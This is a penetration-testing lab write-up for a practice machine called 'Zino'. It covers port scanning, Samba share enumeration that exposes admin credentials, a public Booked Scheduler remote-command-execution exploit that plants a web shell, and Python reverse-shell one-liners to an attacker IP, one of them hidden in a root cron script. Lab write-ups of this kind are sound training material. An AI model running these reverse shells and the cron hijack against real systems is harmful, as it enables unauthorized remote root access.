---
description: 11-10-2022
---

# "Zino" (Intermediate)

<figure><img src="../../../.gitbook/assets/image (53) (1).png" alt=""><figcaption></figcaption></figure>

## Information Gathering

Scanned all TCP ports:

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b26675501b18f5e99fdb2cd4e3957a44 (RSA)
|   256 912d26f1baafd18b698f814a32af9c77 (ECDSA)
|_  256 ec6fdf8bce19138a52573e72a3146f40 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql?
| fingerprint-strings: 
|   NULL, SIPOptions: 
|_    Host '192.168.49.81' is not allowed to connect to this MariaDB server
8003/tcp open  http        Apache httpd 2.4.38
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-02-05 21:02  booked/
|_
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Index of /
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.93%I=7%D=11/10%Time=636D9BA7%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.81'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SIPOption
SF:s,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.81'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: Hosts: ZINO, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: zino
|   NetBIOS computer name: ZINO\x00
|   Domain name: \x00
|   FQDN: zino
|_  System time: 2022-11-10T19:47:50-05:00
|_clock-skew: mean: 1h40m01s, deviation: 2h53m14s, median: 0s
| smb2-time: 
|   date: 2022-11-11T00:47:51
|_  start_date: N/A
```

Enumerated UDP ports:

```
All 1000 scanned ports on 192.168.81.64 are in ignored states
```

Notes:

* 445/Samba enumeration -- Enum4Linux
* 8003/HTTP <mark style="color:yellow;">Apache 2.4.38 -- "Booked Scheduler" Web Application</mark>

## Enumeration

### Port 8003 - HTTP (Apache 2.4.38)-&#x20;

* I was able to create a new login and authenticate with those credentials
* Searchsploit revealed 3 authenticated RCE vulnerabilities that may come in handy later

```
searchsploit booked

Exploit Title                                 |  Path
----------------------------------------------- ---------------------------------
Booked Scheduler 2.7.5 - Remote Command Execut | php/webapps/46486.rb
Booked Scheduler 2.7.5 - Remote Command Execut | php/webapps/50594.py
Booked Scheduler 2.7.7 - Authenticated Directo | php/webapps/48428.txt
```

* I paid close attention to <mark style="color:yellow;">50594.py</mark>
  * Reason being: Python script -- familiar territory

### Port 445 - Samba&#x20;

Enum4Linux:

```
Sharename       Type      Comment
        ---------       ----      -------
        zino            Disk      Logs
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            

[+] Attempting to map shares on 192.168.81.64                                    
                                                                                 
//192.168.81.64/zino    Mapping: OK Listing: OK Writing: N/A                     
//192.168.81.64/print$  Mapping: DENIED Listing: N/A Writing: N/A
```

We can access the <mark style="color:yellow;">zino</mark> share with <mark style="color:yellow;">smbclient</mark>:

<figure><img src="../../../.gitbook/assets/image (54) (1).png" alt=""><figcaption></figcaption></figure>

* From here, I downloaded all of the files for further enumeration

<mark style="color:yellow;">Misc.log</mark>:

<figure><img src="../../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

<mark style="color:yellow;">admin</mark>:<mark style="color:yellow;">adminadmin</mark>

* I then logged into the web server with these credentials and we were now admin!
* Now that we have authentication, let's go back to the <mark style="color:yellow;">50594.py exploit</mark>

## Exploitation

### 50594.py -- <mark style="color:yellow;">Booked Scheduler 2.7.5 - Remote Command Execution</mark>&#x20;

```
python3 50594.py http://192.168.81.64:8003 admin adminadmin
[+] Logged in successfully.
[+] Uploaded shell successfully
[+] http://192.168.81.64:8003/booked/Web/custom-favicon.php?cmd=
```

* A web shell was created!

<figure><img src="../../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

* My next goal was to establish further persistence with another reverse shell
* However, since we are still in a web shell, we need to URL encode the reverse shell

Cyber Chef:

<figure><img src="../../../.gitbook/assets/image (50) (1).png" alt=""><figcaption></figcaption></figure>

URL-Encoded Python Reverse Shell:

{% code overflow="wrap" %}
```
python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22192.168.49.81%22%2C3306))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)%3B%27%0A
```
{% endcode %}

* Start a nc listener on Kali -- <mark style="color:red;">`nc -lnvp 3306`</mark>
* Execute the reverse shell within the web shell and you will gain further persistence

<figure><img src="../../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

*   I then stabalized my shell with Python &#x20;

    ```
    python -c 'import pty;pty.spawn("/bin/bash")'
    ```

### Privilege Escalation

* Uploaded <mark style="color:yellow;">linpeas</mark>

### PrivEsc vector

* <mark style="color:yellow;">Vulnerable Cron Job running every three minutes -- It is running with root permissions as well</mark>

<figure><img src="../../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

* I simply removed the file -- <mark style="color:yellow;">`rm -f /var/www/html/booked/cleanup.py`</mark>

Replaced it with the following:

```
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.81",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > /var/www/html/booked/cleanup.py
```

Nc Listener:

```
nc -lnvp 21
```

* Waited three minutes and I was able to get a shell as root!

## Proofs

<figure><img src="../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
